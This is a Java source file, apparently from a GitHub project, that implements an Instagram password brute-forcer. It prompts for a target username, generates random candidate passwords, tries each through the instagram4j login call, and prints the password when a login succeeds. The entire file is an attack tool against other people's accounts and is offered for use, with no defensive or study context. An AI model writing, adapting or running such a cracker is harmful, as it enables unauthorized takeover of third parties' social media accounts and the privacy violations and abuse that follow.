package STATIC;

import com.github.instagram4j.instagram4j.IGClient;

import java.awt.*;
import java.io.FileInputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.ThreadLocalRandom;

public class MAIN {

    public static String githubLink = "https://github.com/static26";

    public static void main(String[] args) throws Exception{
        ArrayList<String> ignoreds = new ArrayList<>();
        Scanner scan = new Scanner(System.in);
        Desktop desktop = Desktop.getDesktop();
        while(true){
            System.out.println("Type \"exit\" to exit");
            System.out.println();
            System.out.println("Target Instagram Username");
            String targetUsername = scan.nextLine();
            if(targetUsername.equals("exit")){
                System.exit(0);
            }
            while(true){
                int randSize = ThreadLocalRandom.current().nextInt(5,16);


                String string = GeneratorAndCracker.generateRandomString(randSize);
                if(GeneratorAndCracker.ArraySearch(string, ignoreds)){
                    System.out.println("Trying " + string);
                    try{
                        IGClient targetInstagram = IGClient.builder()
                                .username(targetUsername)
                                .password(string)
                                .login();
                    }
                    catch (Exception ex){
                        ignoreds.add(string);
                        System.out.println("Failed, trying again");
                        System.out.println();
                        continue;
                    }
                    System.out.println();
                    System.err.println(targetUsername + "'s password was found");
                    System.err.println(string);
                    System.err.println();
                    System.err.println(githubLink);
                    try {
                        Thread.sleep(3000L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

}
